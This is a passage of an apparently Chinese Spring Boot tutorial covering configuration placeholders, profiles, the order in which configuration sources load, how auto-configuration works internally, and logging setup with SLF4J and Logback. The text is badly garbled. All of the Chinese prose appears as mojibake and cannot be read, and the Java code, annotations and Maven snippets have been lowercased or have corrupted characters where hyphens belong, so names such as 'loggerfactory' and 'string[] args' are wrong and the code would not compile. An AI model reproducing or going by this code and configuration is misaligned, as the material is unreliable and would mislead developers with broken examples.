ä½ç¬¦\n\n# éæºæ°\n\n${random.value}ã${random.int}ã${random.long}\n${random.int(10)}ã${random.int[1024,65536]}\n\n\n1\n2\n\n\n# å ä½ç¬¦è·åéç½®å¼\n\nperson.lastâname=å¼ ä¸${random.uuid}\nperson.age=${random.int}\nperson.birth=2017/12/15\nperson.boss=false\nperson.maps.k1=v1\nperson.maps.k2=14\nperson.lists=a,b,c\nperson.dog.name=${person.hello:hello}_dog\nperson.dog.age=15\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# profileå¤ç¯å¢æ¯æ\n\næä»¬å¨ä¸»éç½®æä»¶ç¼åçæ¶åï¼æä»¶åå¯ä»¥æ¯ application-{profile}.properties/ymlã\n\né»è®¤ä½¿ç¨application.propertiesçéç½®ãå½æä»¬éè¦æ¿æ´»æå®çéç½®æä»¶æ¶ï¼å¯ä»¥å¨ä¸»éç½®æä»¶ä¸­æå®ï¼spring.profiles.active=devæèä½¿ç¨å½ä»¤è¡æ¹å¼java -jar spring-boot-02-config-0.0.1-snapshot.jar --spring.profiles.active=devï¼æèä½¿ç¨èææºæ¹å¼-dspring.profiles.active=devã\n\n\n# ymlå¤ææ¡£åæ¨¡å¼\n\nserver:\n port: 8081\n spring:\n profiles:\n active: prod\nâââ\nserver:\n port: 8083\n spring:\n profiles: dev\nâââ\nserver:\n port: 8084\n spring:\n profiles: prod #æå®å±äºåªä¸ªç¯å¢\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# éç½®æä»¶çå è½½\n\nspringbootå¯å¨ä¼æ«æä»¥ä¸ä½ç½®çapplication.propertiesæèapplication.ymlæä»¶ä½ä¸ºspringbootçé»è®¤éç½®æä»¶ã\n\nâfile:./config/  å½åé¡¹ç®çconfigç®å½\nâfile:./\nâclasspath:/config/\nâclasspath:/\n\n\n1\n2\n3\n4\n\n\nä¼åçº§ç±é«å°åºï¼é«ä¼åçº§çéç½®ä¼è¦çä½ä¼åçº§çéç½®ãåªè¦ä»¥ä¸çéç½®æä»¶å­å¨springbootå°±ä¼å è½½ï¼å½¢æéç½®æä»¶çäºè¡¥ã\n\næä»¬è¿å¯ä»¥éè¿spring.config.locationæ¥æ¹åé»è®¤çéç½®æä»¶ä½ç½®(ä½¿ç¨å½ä»¤è¡åæ°çæ¹å¼)ï¼\n\njava -jar spring-boot-02-config-0.0.1-snapshot.jar --spring.profiles.active=dev --spring.config.location=xxx\n\n\n1\n\n\nè¿ä¸ªéç½®æä»¶çä½ç½®ä¼åå¶ä»ä½ç½®ä¸çéç½®æä»¶å±åå è½½ã\n\nspringbootä¹å¯ä»¥ä»ä»¥ä¸ä½ç½®å è½½éç½®ï¼ä¼åçº§ä»é«å°ä½ï¼é«ä¼åçº§çéç½®è¦çä½ä¼åçº§çéç½®ï¼ææçéç½®ä¼ å½¢æäºè¡¥éç½®ã\n\n 1.  å½ä»¤è¡åæ°\n 2.  æ¥èªjava:comp/envçjndiå±æ§\n 3.  javaç³»ç»å±æ§ï¼system.getproperties()ï¼\n 4.  æä½ç³»ç»ç¯å¢åé\n 5.  randomvaluepropertysourceéç½®çrandom.*å±æ§å¼\n 6.  jaråå¤é¨çapplication-{profile}.propertiesæapplication.yml(å¸¦spring.profile)éç½®æä»¶\n 7.  jarååé¨çapplication-{profile}.propertiesæapplication.yml(å¸¦spring.profile)éç½®æä»¶\n 8.  jaråå¤é¨çapplication.propertiesæapplication.yml(ä¸å¸¦spring.profile)éç½®æä»¶\n 9.  jarååé¨çapplication.propertiesæapplication.yml(ä¸å¸¦spring.profile)éç½®æä»¶\n 10. @configurationæ³¨è§£ç±»ä¸ç@propertysource\n 11. éè¿springapplication.setdefaultpropertiesæå®çé»è®¤å±æ§\n\n\n# èªå¨éç½®åç\n\néç½®æä»¶è½å¤éç½®çå±æ§å¯ä»¥åèï¼springbootéç½®æä»¶\n\n 1.  springbootå¯å¨ç±»ä¸æä¸ä¸ªæ³¨è§£@springbootapplicationï¼è¯¥æ³¨è§£æ¯ä¸ä¸ªç»åæ³¨è§£\n     \n     @target({elementtype.type})\n     @retention(retentionpolicy.runtime)\n     @documented\n     @inherited\n     @springbootconfiguration\n     @enableautoconfiguration\n     @componentscan(\n         excludefilters = {@filter(\n         type = filtertype.custom,\n         classes = {typeexcludefilter.class}\n     ), @filter(\n         type = filtertype.custom,\n         classes = {autoconfigurationexcludefilter.class}\n     )}\n     )\n     public @interface springbootapplication {\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     \n\n 2.  å¶ä¸­æä¸ä¸ª@enableautoconfigurationï¼è¯¥æ³¨è§£å°±æ¯å®ç°èªå¨éç½®æå³çæ³¨è§£ã\n     \n     @target({elementtype.type})\n     @retention(retentionpolicy.runtime)\n     @documented\n     @inherited\n     @autoconfigurationpackage\n     @import({autoconfigurationimportselector.class})\n     public @interface enableautoconfiguration {\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     \n\n 3.  å¶ä¸­@importå¯¼å¥äºä¸ä¸ªèªå¨éç½®å¯¼å¥éæ©å¨ï¼å¨è¯¥éæ©å¨ä¸­ï¼æä¸ä¸ªæ¹æ³ï¼å°ææçèªå¨éç½®å¨ç±»åä¿å­å°ä¸ä¸ªconfigurationsä¸­ã\n     \n         protected autoconfigurationimportselector.autoconfigurationentry getautoconfigurationentry(annotationmetadata annotationmetadata) {\n             if (!this.isenabled(annotationmetadata)) {\n                 return empty_entry;\n             } else {\n                 annotationattributes attributes = this.getattributes(annotationmetadata);\n                 list<string> configurations = this.getcandidateconfigurations(annotationmetadata, attributes);\n                 configurations = this.removeduplicates(configurations);\n                 set<string> exclusions = this.getexclusions(annotationmetadata, attributes);\n                 this.checkexcludedclasses(configurations, exclusions);\n                 configurations.removeall(exclusions);\n                 configurations = this.getconfigurationclassfilter().filter(configurations);\n                 this.fireautoconfigurationimportevents(configurations, exclusions);\n                 return new autoconfigurationimportselector.autoconfigurationentry(configurations, exclusions);\n             }\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     \n\n 4.  è·åconfigurationçæ¹æ³æ¯getcandidateconfigurationsã\n     \n         protected list<string> getcandidateconfigurations(annotationmetadata metadata, annotationattributes attributes) {\n             list<string> configurations = springfactoriesloader.loadfactorynames(this.getspringfactoriesloaderfactoryclass(), this.getbeanclassloader());\n             assert.notempty(configurations, "no auto configuration classes found in meta-inf/spring.factories. if you are using a custom packaging, make sure that file is correct.");\n             return configurations;\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     \n\n 5.  è¯¥æ¹æ³ä¸­è°ç¨äºspringfactoriesloaderä¸­çloadfactorynamesè·åå°äºææçéç½®æä»¶ä¸­éç½®çauto configurationå¨ç±»åã\n     \n     enumeration urls = classloader.getresources("meta-inf/spring.factories");\n     \n     \n     1\n     \n\n 6.  è¯¥æ¹æ³æ«æææjaråä¸çmeta-inf/spring.factoriesï¼ææ«æå°çè¿äºæä»¶çåå®¹åè£æpropertieså¯¹è±¡ï¼ä»propertiesä¸­è·åå°enableautoconfiguration.classç±»(ç±»å)å¯¹åºçå¼ï¼ç¶åæä»ä»¬æ·»å å¨å®¹å¨ä¸­ã\n\n 7.  æ¯ä¸ä¸ªè¿æ ·çxxxautoconfigurationç±»é½æ¯å®¹å¨ä¸­çä¸ä¸ªç»ä»¶ï¼é½å å¥å°å®¹å¨ä¸­ï¼ç¨ä»ä»¬æ¥åèªå¨éç½®ã\n\n 8.  ä»¥httpencodingautoconfigurationï¼httpç¼ç èªå¨éç½®ï¼ä¸ºä¾è§£éèªå¨éç½®åçã\n     \n     @configuration(\n         proxybeanmethods = false\n     )  // //è¡¨ç¤ºè¿æ¯ä¸ä¸ªéç½®ç±»ï¼ä»¥åç¼åçéç½®æä»¶ä¸æ ·ï¼ä¹å¯ä»¥ç»å®¹å¨ä¸­æ·»å ç»ä»¶\n     @enableconfigurationproperties({serverproperties.class})  ////å¯å¨æå®ç±»çconfigurationpropertiesåè½ï¼å°éç½®æä»¶ä¸­å¯¹åºçå¼åserverpropertiesç»å®èµ·æ¥ï¼å¹¶æserverpropertieså å¥å°iocå®¹å¨ä¸­\n     \n     @conditionalonwebapplication(\n         type = type.servlet\n     )  // n //springåºå±@conditionalæ³¨è§£ï¼springæ³¨è§£çï¼ï¼æ ¹æ®ä¸åçæ¡ä»¶ï¼å¦ææ»¡è¶³æå®çæ¡ä»¶ï¼æ´ä¸ªéç½®ç±»éé¢çéç½®å°±ä¼çæï¼ å¤æ­å½ååºç¨æ¯å¦æ¯webåºç¨ï¼å¦ææ¯ï¼å½åéç½®ç±»çæ\n     \n     @conditionalonclass({characterencodingfilter.class})  //å¤æ­å½åé¡¹ç®ææ²¡æè¿ä¸ªç±», characterencodingfilterï¼springmvcä¸­è¿è¡ä¹±ç è§£å³çè¿æ»¤å¨ï¼\n     \n     @conditionalonproperty(\n         prefix = "server.servlet.encoding",\n         value = {"enabled"},\n         matchifmissing = true\n     ) // //å¤æ­éç½®æä»¶ä¸­æ¯å¦å­å¨æä¸ªéç½® server.servlet.encodingï¼å¦æä¸å­å¨ï¼å¤æ­ä¹æ¯æç«ç\n     //å³ä½¿æä»¬éç½®æä»¶ä¸­ä¸éç½®server.servlet.encoding=trueï¼ä¹æ¯é»è®¤çæçï¼\n     public class httpencodingautoconfiguration {\n         \n         // åencodingåæ å°ï¼encodingç±»ä¸­éç½®å¯¹åºçç¸å³éç½®æä»¶çåå®¹ï¼å ä¸ä¸é¢çåç¼ã\n         private final encoding properties;\n     \n         //åªæä¸ä¸ªæåæé å¨çæåµä¸ï¼åæ°çå¼å°±ä¼ä»å®¹å¨ä¸­æ¿\n         public httpencodingautoconfiguration(serverproperties properties) {\n             this.properties = properties.getservlet().getencoding();\n         }\n     \n         @bean  ////ç»å®¹å¨ä¸­æ·»å ä¸ä¸ªç»ä»¶ï¼è¿ä¸ªç»ä»¶çæäºå¼éè¦ä»propertiesä¸­è·å\n         @conditionalonmissingbean  //å¤æ­å®¹å¨æ²¡æè¿ä¸ªç»ä»¶ï¼\n         public characterencodingfilter characterencodingfilter() {\n             characterencodingfilter filter = new orderedcharacterencodingfilter();\n             filter.setencoding(this.properties.getcharset().name());\n             filter.setforcerequestencoding(this.properties.shouldforce(org.springframework.boot.web.servlet.server.encoding.type.request));\n             filter.setforceresponseencoding(this.properties.shouldforce(org.springframework.boot.web.servlet.server.encoding.type.response));\n             return filter;\n         }\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     8\n     9\n     10\n     11\n     12\n     13\n     14\n     15\n     16\n     17\n     18\n     19\n     20\n     21\n     22\n     23\n     24\n     25\n     26\n     27\n     28\n     29\n     30\n     31\n     32\n     33\n     34\n     35\n     36\n     \n\n 9.  æ ¹æ®å½åä¸åçæ¡ä»¶å¤æ­ï¼å³å®è¿ä¸ªéç½®ç±»æ¯å¦çæãä¸ä½è¿ä¸ªéç½®ç±»çæï¼è¿ä¸ªéç½®ç±»å°±ä¼ç»å®¹å¨ä¸­æ·»å åç§ç»ä»¶ï¼è¿äºç»ä»¶çå±æ§æ¯ä»å¯¹åºçpropertiesç±»ä¸­è·åçï¼è¿äºç±»éé¢çæ¯ä¸ä¸ªå±æ§åæ¯åéç½®æä»¶ç»å®çã\n\n 10. ææå¨éç½®æä»¶ä¸­è½éç½®çå±æ§é½æ¯å¨xxxxpropertiesç±»ä¸­å°è£çï¼éç½®æä»¶è½éç½®ä»ä¹å°±å¯ä»¥åç§æä¸ªåè½å¯¹åºçè¿ä¸ªå±æ§ç±»ã\n     \n     public class encoding {\n         public static final charset default_charset;\n         private charset charset;\n         private boolean force;\n         private boolean forcerequest;\n         private boolean forceresponse;\n         private map<locale, charset> mapping;\n     \n     \n     1\n     2\n     3\n     4\n     5\n     6\n     7\n     \n\n\n# springbootçç²¾é«\n\n * springbootå¯å¨ä¼å è½½å¤§éçèªå¨éç½®ç±»\n * æä»¬çæä»¬éè¦çåè½ææ²¡æspringbooté»è®¤åå¥½çèªå¨éç½®ç±»\n * æä»¬åæ¥çè¿ä¸ªèªå¨éç½®ç±»ä¸­å°åºéç½®äºåªäºç»ä»¶ï¼åªè¦æä»¬è¦ç¨çç»ä»¶æï¼æä»¬å°±ä¸éè¦åæ¥éç½®äºï¼\n * ç»å®¹å¨ä¸­èªå¨éç½®ç±»æ·»å ç»ä»¶çæ¶åï¼ä¼ä»propertiesç±»ä¸­è·åæäºå±æ§ãæä»¬å°±å¯ä»¥å¨éç½®æä»¶ä¸­æå®è¿äºå±æ§çå¼ã\n\n\n# @conditionalæ´¾çæ³¨è§£\n\nä½ç¨ï¼å¯¹çææ¡ä»¶è¿è¡å¤æ­ï¼å¿é¡»æ¯@conditionalæå®çæ¡ä»¶æç«ï¼æç»å®¹å¨ä¸­æ·»å ç»ä»¶ï¼éç½®ééé¢çææåå®¹æçæã\n\n@conditionalæ©å±æ³¨è§£                  ä½ç¨ï¼å¤æ­æ¯å¦æ»¡è¶³å½åæå®æ¡ä»¶ï¼\n@conditionalonjava                ç³»ç»çjavaçæ¬æ¯å¦ç¬¦åè¦æ±\n@conditionalonbean                å®¹å¨ä¸­å­å¨æå®bean\n@conditionalonmissingbean         å®¹å¨ä¸­ä¸å­å¨æå®bean\n@conditionalonexpression          æ»¡è¶³spelè¡¨è¾¾å¼æå®\n@conditionalonclass               ç³»ç»ä¸­ææå®çç±»\n@conditionalonmissingclass        ç³»ç»ä¸­æ²¡ææå®çç±»\n@conditionalonsinglecandidate     å®¹å¨ä¸­åªæä¸ä¸ªæå®çbeanï¼æèè¿ä¸ªbeanæ¯é¦ébean\n@conditionalonproperty            ç³»ç»ä¸­æå®çå±æ§æ¯å¦ææå®çå¼\n@conditionalonresource            ç±»è·¯å¾ä¸æ¯å¦å­å¨æå®èµæºæä»¶\n@conditionalonwebapplication      å½åæ¯webç¯å¢\n@conditionalonnotwebapplication   å½åä¸æ¯webç¯å¢\n@conditionalonjndi                jndiå­å¨æå®é¡¹\n\nå æ­¤ï¼æä»¬èªå¨éç½®ç±»éè¦å¨è¯¥ç±»æ»¡è¶³éç½®ä»¥ä¸æ³¨è§£çæ¡ä»¶ä¸æè½ä½¿ç¨ï¼æä»¬å¯ä»¥å¨éç½®æä»¶ä¸­å¼å¯debugæ¨¡å¼ï¼è¯¥æ¨¡å¼å¯ä»¥æå°èªå¨éç½®æ¥åï¼å¨è¯¥æ¥åä¸­æ æäºåªäºç±»çæï¼åªäºç±»ä¸çæã\n\n\n============================\nconditions evaluation report\n============================\n\n\npositive matches:\n-----------------\n\n   aopautoconfiguration matched:\n      - @conditionalonproperty (spring.aop.auto=true) matched (onpropertycondition)\n\n   aopautoconfiguration.classproxyingconfiguration matched:\n      - @conditionalonmissingclass did not find unwanted class \'org.aspectj.weaver.advice\' (onclasscondition)\n      - @conditionalonproperty (spring.aop.proxy-target-class=true) matched (onpropertycondition)\n\n   dispatcherservletautoconfiguration matched:\n      - @conditionalonclass found required class \'org.springframework.web.servlet.dispatcherservlet\' (onclasscondition)\n      - found \'session\' scope (onwebapplicationcondition)\n\n   dispatcherservletautoconfiguration.dispatcherservletconfiguration matched:\n      - @conditionalonclass found required class \'javax.servlet.servletregistration\' (onclasscondition)\n      - default dispatcherservlet did not find dispatcher servlet beans (dispatcherservletautoconfiguration.defaultdispatcherservletcondition)\n\n   dispatcherservletautoconfiguration.dispatcherservletregistrationconfiguration matched:\n      - @conditionalonclass found required class \'javax.servlet.servletregistration\' (onclasscondition)\n      - dispatcherservlet registration did not find servlet registration bean (dispatcherservletautoconfiguration.dispatcherservletregistrationcondition)\n\nâ¦â¦â¦â¦â¦â¦â¦â¦\n\nnegative matches:\n-----------------\n\n   activemqautoconfiguration:\n      did not match:\n         - @conditionalonclass did not find required class \'javax.jms.connectionfactory\' (onclasscondition)\n\n   aopautoconfiguration.aspectjautoproxyingconfiguration:\n      did not match:\n         - @conditionalonclass did not find required class \'org.aspectj.weaver.advice\' (onclasscondition)\n\n â¦â¦â¦â¦â¦â¦â¦\n\nexclusions:\n-----------\n\n    none\n\n\nunconditional classes:\n----------------------\n\n    org.springframework.boot.autoconfigure.context.configurationpropertiesautoconfiguration\n\n    org.springframework.boot.autoconfigure.context.lifecycleautoconfiguration\n\n    org.springframework.boot.autoconfigure.context.propertyplaceholderautoconfiguration\n\n    org.springframework.boot.autoconfigure.availability.applicationavailabilityautoconfiguration\n\n    org.springframework.boot.autoconfigure.info.projectinfoautoconfiguration\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n\n# æ¥å¿\n\nåºæ¯ï¼å°å¼ å¨å¼åä¸ä¸ªå¤§åçç³»ç»ï¼å¨ç³»ç»ä¸­ä¸ºäºè°è¯æ¹ä¾¿ï¼å°å¼ ä½¿ç¨system.out.printæå°äºä¸äºè°è¯ä¿¡æ¯ãæä¸å¤©ï¼é¢å¯¼è¯´æ³è¦å°æå°çä¿¡æ¯ç§»é¤æï¼è½ç¶å¾å°é¾ï¼å°å¼ è¿æ¯å°èªå·±åçsystem.outä¸è¡ä¸è¡çå æäºãå é¤ä¹åï¼é¢å¯¼è¯´å°å¼ åçè°è¯è¾åºè¿æ¯å¾æç¨çï¼æ³è¦éæ°å ä¸ï¼å¹¶ä¸æå¥½è½å¤è¾åºå°ä¸ä¸ªæä»¶ä¸­å»ãäºæ¯å°å¼ åäºä¸ä¸ªæ¥å¿çæ¡æ¶zhanglogging.jarï¼è°ç¨æ¡æ¶ä¸­çapiæå°æ¥å¿å¹¶ä¸è¾åºå°æä»¶ä¸­ãè¿äºä¸æ®µæ¶é´ï¼å°å¼ æ³ç»ä»çæ¡æ¶ä¸­æ·»å ä¸äºåè½ï¼äºæ¯åäºä¸ä¸ªzhanglogging-better.jarãé£ä¹æä¹æ¿æ¢é¡¹ç®ä¸­çæ¥å¿æ¡æ¶å¢ï¼è¿éè¦éæ°å°ä½¿ç¨è¿æ¥å¿çå°æ¹æ¿æ¢ä¸ºæ°çæ¥å¿æ¡æ¶ãå°å¼ æ³å°äºjdbcï¼jdbcæä¾äºä¸ä¸ªæ°æ®åºçè¿æ¥å¨ï¼åé¢çå®ç°ç¨çä¸åçå·ä½å®ç°çjarãäºæ¯å°å¼ åäºä¸ä¸ªæ¥å¿çæ½è±¡å±ï¼é¡¹ç®ä¸­å¼ç¨äºæ¥å¿çæ½è±¡å±ï¼ç¶åå·ä½çæ¥å¿jarå®ç°äºæ½è±¡å±ãä¸æ¬¡å¦ææ´æ°å°±å¯ä»¥ç´æ¥æ¿æ¢å·ä½çå®ç°å°±å¥½äºã\n\nä¸»æµçæ¥å¿æ¡æ¶ï¼julãjclãjboss-loggingãlogbackãlog4jãlog4j2ãslf4jâ¦â¦\n\nä½æ¯è¿äºæ¡æ¶å¹¶ä¸é½æ¯æ¥å¿çå·ä½å®ç°ã\n\næ¥å¿é¨é¢ ï¼æ¥å¿çæ½è±¡å±ï¼                                                  æ¥å¿å®ç°\njclï¼jakarta commons loggingï¼ãslf4jï¼simple logging facade for   log4j ãjulï¼java.util.loggingï¼ ãlog4j2 ãlogback\njavaï¼ ãjboss-logging\n\næä»¬å¨é¡¹ç®ä¸­æå¥½æ¯ä½¿ç¨æ¥å¿çæ½è±¡å±ï¼ç¶åéæ©ä¸ä¸ªå·ä½çå®ç°ãè¿æ ·å¨åæ¢æ¥å¿æ¡æ¶æ¶å°±åªéè¦æ¿æ¢ææ¥å¿çå·ä½å®ç°å°±å¥½äºãå¶ä¸­log4jãlogbackåslf4jæ¯åä¸ä¸ªä½èç åçãslf4jæ¯æ½è±¡å±ï¼é¨é¢ï¼,logbackæ¯log4jçåè½åçº§çã\n\nspringbooté»è®¤éç¨çæ¥å¿æ¡æ¶æ¯slf4jålogbackçç»åï¼èspringé»è®¤ä½¿ç¨çæ¯jclã\n\n\n# slf4jçä½¿ç¨æ¹æ³\n\nslf4jå®ç½\n\nä»¥åå¼åçæ¶åï¼æ¥å¿è®°å½æ¹æ³çè°ç¨ä¸åºè¯¥æ¥ç´æ¥è°ç¨æ¥å¿çå®ç°ç±»ï¼èæ¯è°ç¨æ¥å¿æ½è±¡å±éé¢çæ¹æ³ãå¹¶ä¸ç»ç³»ç»éé¢å¯¼å¥slf4jçjarå logbackçå®ç°jarã\n\nimport org.slf4j.logger;\nimport org.slf4j.loggerfactory;\npublic class helloworld {\n    public static void main(string[] args) {\n        logger logger = loggerfactory.getlogger(helloworld.class);\n        logger.info("hello world");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n\næ¯ä¸ä¸ªæ¥å¿çå®ç°æ¡æ¶é½æèªå·±çéç½®æä»¶ãä½¿ç¨slf4jä»¥åï¼éç½®æä»¶è¿æ¯åææ¥å¿å®ç°æ¡æ¶èªå·±æ¬èº«çéç½®æä»¶ã\n\n\n# æ¥å¿çç»ä¸\n\nå¨é¡¹ç®ä¸­ï¼ä¸åçç»ä»¶å¯è½ä½¿ç¨çä¸åçæ¥å¿æ¡æ¶ãé£ä¹æä»¬æä¹ä½¿ç¨ç»ä¸çlog4jæ¡æ¶å¢ï¼\n\n\n\næä»¬éè¦å°ææçæ¥å¿æ¡æ¶é½ç»ç»ä¸å°slf4j+logbackçç»åï¼\n\n 1. å»é¤ä¹åé¡¹ç®ä¸­çæ¥å¿æ¡æ¶\n 2. æ·»å xxx-over-slf4j.jarï¼è¿ä¸ªjarååé¨çååæ¯åæ¥çæ¥å¿æ¡æ¶ï¼å·ä½å®ç°æ¯è°ç¨slf4jçapiï¼ç¶ååç±slf4jè°ç¨å·ä½çæ¥å¿å®ç°æ¡æ¶ã\n 3. å¯¼å¥slf4jçå¶ä»å®ç°ã\n\n\n# springbootçæ¥å¿å³ç³»\n\næ¯ä¸ªspringbootåºæ¯å¯å¨å¨ä¸­é½ä¼åå«ä¸ä¸ªspringbootçå¯å¨å¨ã\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>springâbootâstarter</artifactid>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n\n\nè¯¥å¯å¨å¨ä¸­ååå«äºä¸ä¸ªæ¥å¿çå¯å¨å¨\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>springâbootâstarter</artifactid>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n\n\nåºå±çä¾èµå³ç³»ï¼\n\n\n\nå¦æéè¦å¼å¥å¶ä»æ¡æ¶ï¼é¦åå°±éè¦å°è¯¥æ¡æ¶çæ¥å¿åæé¤åºå»ï¼ç¶åä½¿ç¨xxx-over-slf4j.jarï¼ç»ä¸å°slf4jä¸ã\n\n<dependency>\n    <groupid>org.springframework</groupid>\n    <artifactid>springâcore</artifactid>\n    <exclusions>\n        <exclusion>\n            <groupid>commonsâlogging</groupid>\n            <artifactid>commonsâlogging</artifactid>\n        </exclusion>\n    </exclusions>\n</dependency>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# æ¥å¿çä½¿ç¨æ¹æ³\n\n//è®°å½å¨\nlogger logger = loggerfactory.getlogger(getclass());\n@test\npublic void contextloads() {\n    //system.out.println();\n    //æ¥å¿ççº§å«ï¼\n    //ç±ä½å°é« trace<debug<info<warn<error\n    //å¯ä»¥è°æ´è¾åºçæ¥å¿çº§å«ï¼æ¥å¿å°±åªä¼å¨è¿ä¸ªçº§å«ä»¥ä»¥åçé«çº§å«çæ\n    logger.trace("è¿æ¯traceæ¥å¿...");\n    logger.debug("è¿æ¯debugæ¥å¿...");\n    //springbooté»è®¤ç»æä»¬ä½¿ç¨çæ¯infoçº§å«çï¼æ²¡ææå®çº§å«çå°±ç¨springbooté»è®¤è§å®ççº§å«ï¼root\n    çº§å«\n        logger.info("è¿æ¯infoæ¥å¿...");\n    logger.warn("è¿æ¯warnæ¥å¿...");\n    logger.error("è¿æ¯erroræ¥å¿...");\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\næ¥å¿è¾åºçæ ¼å¼è®¾ç½®ï¼\n\næ¥å¿è¾åºæ ¼å¼ï¼\n%dè¡¨ç¤ºæ¥ææ¶é´ï¼\n%threadè¡¨ç¤ºçº¿ç¨åï¼\n%â5levelï¼çº§å«ä»å·¦æ¾ç¤º5ä¸ªå­ç¬¦å®½åº¦\n%logger{50} è¡¨ç¤ºloggeråå­æé¿50ä¸ªå­ç¬¦ï¼å¦åæç§å¥ç¹åå²ã\n%msgï¼æ¥å¿æ¶æ¯ï¼\n%næ¯æ¢è¡ç¬¦\n%d{yyyyâmmâdd hh:mm:ss.sss} [%thread] %â5level %logger{50} â %msg%n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nspringbootä¿®æ¹éç½®æä»¶ä¿®æ¹æ¥å¿ï¼\n\nlogging.level.com.atguigu=trace\n#logging.path=\n# ä¸æå®è·¯å¾å¨å½åé¡¹ç®ä¸çæspringboot.logæ¥å¿\n# å¯ä»¥æå®å®æ´çè·¯å¾ï¼\n#logging.file=g:/springboot.log\n# å¨å½åç£ççæ ¹è·¯å¾ä¸åå»ºspringæä»¶å¤¹åéé¢çlogæä»¶å¤¹ï¼ä½¿ç¨ spring.log ä½ä¸ºé»è®¤æä»¶\nlogging.path=/spring/log\n# å¨æ§å¶å°è¾åºçæ¥å¿çæ ¼å¼\nlogging.pattern.console=%d{yyyyâmmâdd} [%thread] %â5level %logger{50} â %msg%n\n# æå®æä»¶ä¸­æ¥å¿è¾åºçæ ¼å¼\nlogging.pattern.file=%d{yyyyâmmâdd} === [%thread] === %â5level === %logger{50} ==== %msg%n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\nlogging.file   logging.path   example    description\n(none)         (none)                    åªå¨æ§å¶å°è¾åº\næå®æä»¶å          (none)         my.log     è¾åºæ¥å¿å°my.logæä»¶\n(none)         æå®ç®å½           /var/log   è¾åºå°æå®ç®å½ç spring.log æä»¶ä¸­\n\n\n# æ¥å¿éç½®æä»¶\n\nç»ç±»è·¯å¾ä¸æ¾ä¸æ¯ä¸ªæ¥å¿æ¡æ¶èªå·±çéç½®æä»¶ï¼springbootå°±ä¸ä½¿ç¨ä»é»è®¤éç½®ã\n\nlogging system            customization\nlogback                   logback-spring.xml , logback-spring.groovy , logback.xml or\n                          logback.groovy\nlog4j2                    log4j2-spring.xml or log4j2.xml\njdk (java util logging)   logging.properties\n\nå¶ä¸­ï¼å¯ä»¥ä½¿ç¨logback-spring.xmléç½®æä»¶ï¼è¯¥éç½®æä»¶å¯ä»¥æ ¹æ®ç¯å¢profileï¼éæ©ä¸åçéç½®ãè¯¥éç½®æä»¶ä¼è¢«springbootè¯å«ï¼èlogback.xmlå°ä¼è¢«logbackç»ä»¶ç´æ¥è¯å«ï¼å¶ä¸­ä¸è½ç¼åç¸å³çå¶ä»éç½®ã\n\n<springprofile name="staging">\n    <!ââ configuration to be enabled when the "staging" profile is active ââ>\n    å¯ä»¥æå®ææ®µéç½®åªå¨æä¸ªç¯å¢ä¸çæ\n</springprofile>\n\n<appender name="stdout" class="ch.qos.logback.core.consoleappender">\n    <!ââ\n    æ¥å¿è¾åºæ ¼å¼ï¼\n    %dè¡¨ç¤ºæ¥ææ¶é´ï¼\n    %threadè¡¨ç¤ºçº¿ç¨åï¼\n    %â5levelï¼çº§å«ä»å·¦æ¾ç¤º5ä¸ªå­ç¬¦å®½åº¦\n    %logger{50} è¡¨ç¤ºloggeråå­æé¿50ä¸ªå­ç¬¦ï¼å¦åæç§å¥ç¹åå²ã\n    %msgï¼æ¥å¿æ¶æ¯ï¼\n    %næ¯æ¢è¡ç¬¦\n    ââ>\n    <layout class="ch.qos.logback.classic.patternlayout">\n        <springprofile name="dev">\n            <pattern>%d{yyyyâmmâdd hh:mm:ss.sss} ââââ> [%thread] âââ> %â5level\n                %logger{50} â %msg%n</pattern>\n        </springprofile>\n        <springprofile name="!dev">\n            <pattern>%d{yyyyâmmâdd hh:mm:ss.sss} ==== [%thread] ==== %â5level\n                %logger{50} â %msg%n</pattern>\n        </springprofile>\n    </layout>\n</appender>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n\n# åæ¢æ¥å¿æ¡æ¶ä¸ºslf4j+log4j\n\né¦åå°logbackæé¤ï¼ç¶åå°log4j-over-slf4jæé¤ï¼å¼å¥slf4j-log4j12\n\n<dependency>\n    <groupid>org.springframework.boot</groupid>\n    <artifactid>springâbootâstarterâweb</artifactid>\n    <exclusions>\n        <exclusion>\n            <artifactid>logbackâclassic</artifactid>\n            <groupid>ch.qos.logback</groupid>\n        </exclusion>\n        <exclusion>\n            <artifactid>log4jâoverâslf4j</artifactid>\n            <groupid>org.slf4j</groupid>\n        </exclusion>\n    </exclusions>\n</dependency>\n<dependency>\n    <groupid>org.slf4j</groupid>\n    <artifactid>slf4jâlog4j12</artifactid>\n</dependency>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nè¿ä¹åæ²¡æä»ä¹æä¹ï¼å 